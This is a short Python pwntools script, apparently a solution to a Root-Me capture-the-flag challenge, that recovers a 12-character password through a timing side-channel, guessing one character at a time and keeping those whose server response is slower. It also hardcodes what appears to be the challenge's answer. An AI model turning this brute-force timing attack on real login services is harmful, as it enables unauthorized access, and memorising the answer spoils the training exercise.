from pwn import *
from time import time

PASSWORD = "30467-132630"
pwd = ""
len_init = len(pwd)
LENGTH = 12
COMP_CHAR = 0.5  # obtenu après un test sur le premier charactère


alphabet = string.printable[:-5]
print(f"Alphabet: {alphabet} | len: {len(alphabet)}\n pwd: {pwd} | len: {len(pwd)}")


r = remote("challenge01.root-me.org", 51015)
start = r.recvline()
print(f"Message du serveur:\n{start.decode('utf-8')}")


for i in range(LENGTH):
    for c in alphabet:
        try_pwd = pwd + c
        r.sendline(try_pwd.encode())
        start = time()
        reponse = r.recvline()
        end = time()
        time_c = end - start
        if abs(time_c - COMP_CHAR * (i+1)) <= 0.2:
            pwd += c
            break
        print(f"try_pwd: {try_pwd} | time: {time_c}")
    print(f"pwd[:{len(pwd)}]: {pwd} | time: {time_c}")

r.sendline(pwd.encode())
reponse = r.recvline()
print(f"reponse: {reponse.decode('utf-8')}")
r.close()
